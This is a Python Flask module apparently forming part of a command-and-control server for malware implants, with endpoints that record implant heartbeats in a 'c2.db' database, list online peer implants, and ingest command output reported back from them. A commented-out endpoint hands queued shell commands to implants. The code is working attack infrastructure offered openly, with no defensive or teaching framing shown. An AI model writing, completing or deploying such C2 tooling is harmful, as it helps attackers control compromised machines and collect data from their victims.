from flask import Blueprint, request, jsonify # type: ignore
import sqlite3, datetime

implants_blueprint = Blueprint('implants', __name__, url_prefix='/implants')



"""
Kind of self-explanatory, this endpoint is for registering new implants and their heartbeats
"""
@implants_blueprint.route('/heartbeat', methods=['POST'])
def heartbeat():
    data     = request.get_json() or {}
    hostname = data.get("hostname", "unknown")
    ip       = request.remote_addr
    port     = data.get("port")
    now      = datetime.datetime.now().isoformat()

    if not port:
        return jsonify({"status":"error","message":"Port is required"}), 400

    try:
        conn   = sqlite3.connect("c2.db")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO implants (hostname, ip, port, last_heartbeat)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(ip, port) DO UPDATE SET
              last_heartbeat = excluded.last_heartbeat,
              hostname       = excluded.hostname
        """, (hostname, ip, port, now))
        conn.commit()
    except sqlite3.Error as e:
        print(f"⚠️ SQLite ERROR inserting implant row - {e}")
        return jsonify({"message": str(e)}), 500

    print(f"💓 - Heartbeat from {hostname} ({ip}:{port}) at {now}")
    return "OK", 200


"""
Get all the online peers (15 seconds heartbeat timeout)
"""
@implants_blueprint.route("/peers", methods=["GET"])
def get_peers():
    try:
        conn = sqlite3.connect("c2.db")
        cursor = conn.cursor()

        cursor.execute("SELECT ip, port, last_heartbeat FROM implants")
        peers = cursor.fetchall()
        conn.close()
    except sqlite3.Error as e:
        print(f"⚠️ - SQLite ERROR fetching peers - {e}")
        return jsonify({"message": str(e)}), 500
    
    now = datetime.datetime.now()
    online_peers = []
    for ip, port, last_heartbeat in peers:
        try:
            heartbeat_time = datetime.datetime.fromisoformat(last_heartbeat)
            if (now - heartbeat_time).total_seconds() <= 30:
                # print(ip, port)
                online_peers.append({"ip": ip, "port": port, "last_heartbeat": last_heartbeat})
        except Exception:
            continue
    

    requester_ip = request.remote_addr
    requester_port = int(request.args.get("port", 0))
    peers = [
      {"ip": peer["ip"], "port": peer["port"]}
      for peer in online_peers
      if not (peer["ip"] == requester_ip and peer["port"] == requester_port)
    ]
    # print(online_peers)
    # print(peers)
    return jsonify(peers), 200



# """
# Get the next command on the line
# """
# @implants_blueprint.route("/get-payload", methods=["GET"])
# def get_payload():

#     conn = sqlite3.connect("c2.db")
#     conn.row_factory = sqlite3.Row

#     cursor = conn.cursor()
#     cursor.execute("""
#         SELECT id, command_text, sent_at
#         FROM commands
#         WHERE status IS NULL OR status = 'pending'
#         ORDER BY sent_at ASC
#         LIMIT 1
#     """)
#     row = cursor.fetchone()

#     if not row:
#         return jsonify({"cmd": "sleep 5"}), 200
    
#     cmd_id, command_text, sent_at = row["id"], row["command_text"], row["sent_at"]

#     cursor.execute("UPDATE commands SET status = 'in-flight' WHERE id = ?", (cmd_id,))
#     conn.commit()
#     conn.close()

#     return jsonify({
#         "id": cmd_id,
#         "cmd": command_text,
#         "sent_at": sent_at
#     }), 200



"""
Receive the report of results from the implant, lowkey it floods the server but its fine because we are filtering stuff and saving only one result per command per implant
"""
@implants_blueprint.route("/report", methods=["POST"])
def report():
    payload = request.get_json() or {}
    bulk    = payload.get("results")
    reporter_ip = request.remote_addr

    if not bulk or not isinstance(bulk, list):
        return jsonify({"message": "No results provided"}), 400

    try:
        conn = sqlite3.connect('c2.db')
        cursor = conn.cursor()

        ingested = 0
        for r in bulk:
            cmd_id  = r.get("command_id")
            output  = r.get("output", "")
            ts      = r.get("timestamp", datetime.datetime.now().isoformat())
            ip      = r.get("implant_ip") or reporter_ip


            cursor.execute("SELECT id FROM implants WHERE ip = ?", (ip,))
            row = cursor.fetchone()
            if not row:
                continue

            implant_id = row[0]

            
            cursor.execute("""
                INSERT OR IGNORE INTO results
                  (command_id, implant_id, output, received_at)
                VALUES (?, ?, ?, ?)
            """, (cmd_id, implant_id, output, ts))
            ingested += cursor.rowcount  # 1 if inserted, 0 if ignored ig

        conn.commit()
        conn.close()

    except sqlite3.Error as e:
        print(f"⚠️ SQLite ERROR inserting results - {e}")
        return jsonify({"message": str(e)}), 500

    print(f"📥 - Received {len(bulk)} results from {reporter_ip}, ingested {ingested} new entries")
    return jsonify({"message": "ok", "ingested": ingested}), 200